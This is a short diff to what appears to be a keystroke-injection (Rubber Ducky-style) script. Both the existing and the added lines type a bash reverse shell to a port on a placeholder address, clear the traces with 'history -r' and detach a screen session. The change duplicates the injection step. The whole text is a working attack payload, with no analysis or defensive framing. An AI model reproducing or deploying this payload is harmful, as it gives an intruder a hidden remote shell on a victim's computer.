@@ -15,6 +15,12 @@ DELAY 1000
 STRING bash -i>& /dev/tcp/0.0.0.0/3333 0>&1; history -r
 DELAY 200
 ENTER
+DELAY 500
+CTRL SPACE
+DELAY 500
+STRING bash -i>& /dev/tcp/0.0.0.0/3333 0>&1; history -r
+DELAY 200
+ENTER
 DELAY 1500
 CTRL a d
 DELAY 1000
